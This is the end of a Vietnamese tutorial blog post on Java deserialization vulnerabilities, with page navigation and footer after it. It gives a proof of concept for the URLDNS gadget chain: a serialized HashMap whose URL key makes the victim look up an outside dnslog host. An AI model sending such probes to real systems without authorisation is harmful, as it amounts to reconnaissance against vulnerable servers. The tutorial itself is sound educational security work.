+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://2g1hil.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//Field hashcode = url.getClass().getDeclaredField(&quot;hashCode&quot;); Cách khác để lấy field hashcode</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>file: Deser.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Deser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Deserialize(<span class="string">&quot;ser2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Kết quả:</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp" alt="DNSresult"></p>
+<p>Vậy là mình đã giới thiệu xong về cơ bản của quá trình Deserialization và đi qua hết chuỗi URLDNS. Đây chỉ là những kiến thức cơ bản của lỗ hổng Java Deserialization. Để hiểu sâu hơn về lỗ hổng này, mình thực sự khuyên các bạn hãy hiểu tường tận về những keyword sau: “Class Class”, “Class Object”, “Class Runtime”, “Reflection”, các khái niệm về OOP, và còn nhiều thứ khác nữa. Và hãy cố gắng đọc hiểu và tự mình viết POC cho lỗ hổng này, khá khó để bắt đầu nhưng hi vọng các bạn có thể vượt qua.</p>
+<blockquote>
+<p>Hành trình nào mà không có gian nan, đau khổ ^^… Chúc các bạn học tốt~</p>
+</blockquote>
+</div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/";
+            const title         = "「Introduction to Java Deserialization」";
+            const excerpt       = `Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deseri...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Deserialization/" rel="tag">Deserialization</a>, <a class="tag-none-link" href="/tags/Java/" rel="tag">Java</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2022-11-03T16:55:27.879Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2022-11-03</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Java Reflection" href="/2022/11/02/Java-reflection/">&lt; Bài đăng cũ hơn</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                2
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                3
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                4
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        Thư mục bài viết
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Serialization-va-Deserialization"><span class="toc-text">Serialization và Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Serialization-va-deserialization-la-gi"><span class="toc-text">1. Serialization và deserialization là gì?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Nhung-qua-trinh-can-su-dung-den-Serialization"><span class="toc-text">2. Những quá trình cần sử dụng đến Serialization:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban"><span class="toc-text">3. Triển khai quá trình Ser và Deser cơ bản:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cach-ma-lo-hong-Deserialization-xay-ra"><span class="toc-text">Cách mà lỗ hổng Deserialization xảy ra:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization"><span class="toc-text">1. HashMap và cách nó gây ra lỗ hổng Deserialization:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Phan-tich-chuoi-URLDNS"><span class="toc-text">2. Phân tích chuỗi URLDNS:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-POC-cho-chuoi-URLDNS"><span class="toc-text">3. POC cho chuỗi URLDNS:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap"><span class="toc-text">Chú ý khi thực hiện serialize object của lớp HashMap:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-hoan-thien-cua-chuoi-URLDNS"><span class="toc-text">POC hoàn thiện của chuỗi URLDNS:</span></a></li></ol></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Deserialization/" style="font-size: 0.6em;">Deserialization</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/03/JavaDeserializationBasic/"><i class="fa  fa-book"></i> Introduction to Java Deserialization</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/02/Java-reflection/"><i class="fa  fa-book"></i> Java Reflection</a>
+            
+          
+        
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
